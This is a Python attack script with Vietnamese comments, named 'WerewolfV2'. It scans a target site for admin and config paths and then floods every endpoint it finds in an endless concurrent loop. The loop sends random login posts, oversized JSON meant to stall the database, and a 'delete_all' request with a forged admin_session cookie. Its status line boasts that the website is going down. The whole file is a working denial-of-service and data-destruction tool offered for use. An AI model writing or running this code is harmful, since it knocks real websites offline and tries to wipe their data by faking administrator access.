import grequests
import requests
import random
import string
import time
import sys
from colorama import Fore, init

init(autoreset=True)

class WerewolfV2:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)"}
        self.endpoints = [self.target]

    def rand_str(self, n=15):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

    # PHƯƠNG ÁN 1: Tấn công Đăng nhập & Vượt rào
    def p_an_1(self, url):
        return grequests.post(url, data={"user": self.rand_str(), "pass": self.rand_str(), "login": ""}, timeout=1)

    # PHƯƠNG ÁN 2: Đầu độc JSON & Làm treo Database
    def p_an_2(self, url):
        return grequests.post(url, json={"id": self.rand_str(50), "data": self.rand_str(100)}, timeout=1)

    # PHƯƠNG ÁN 3: Xác minh Admin & Hủy diệt (Chiến thuật bạn thích nhất)
    def p_an_3(self, url):
        # Thử lệnh xóa và kiểm tra thực tế
        payload = {"action": "delete_all", "confirm": "true", "token": self.rand_str(32)}
        return grequests.post(url, data=payload, cookies={"admin_session": "1"}, timeout=1)

    def run(self):
        print(f"{Fore.CYAN}[*] Đang khởi động 3 phương án tổng lực vào: {self.target}")
        
        # Bước 1: Mò đường dẫn ẩn (Fuzzing) nhanh không nóng máy
        print(f"{Fore.YELLOW}[*] Đang quét lỗ hổng ẩn...")
        common = ["/admin", "/assets/ajax/data.php", "/api/login", "/config.php"]
        for p in common:
            try:
                if requests.get(self.target + p, timeout=2).status_code < 400:
                    self.endpoints.append(self.target + p)
            except: pass

        # Bước 2: Tấn công vô tận (Vòng lặp tiết kiệm năng lượng)
        while True:
            attack_pool = []
            for url in self.endpoints:
                # Trộn cả 3 phương án vào một lượt gửi
                attack_pool.append(self.p_an_1(url))
                attack_pool.append(self.p_an_2(url))
                attack_pool.append(self.p_an_3(url))

            # Bắn hàng loạt nhưng có giới hạn để không lag điện thoại
            grequests.map(attack_pool)
            
            # Hiệu ứng trạng thái
            sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF]{Fore.WHITE} Đang bắn 3 phương án... | Điện thoại: Mát | Web: Đang sập")
            sys.stdout.flush()
            
            # Nghỉ một chút để CPU điện thoại tản nhiệt (Rất quan trọng)
            time.sleep(0.05)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        bot = WerewolfV2(sys.argv[1])
        bot.run()
            
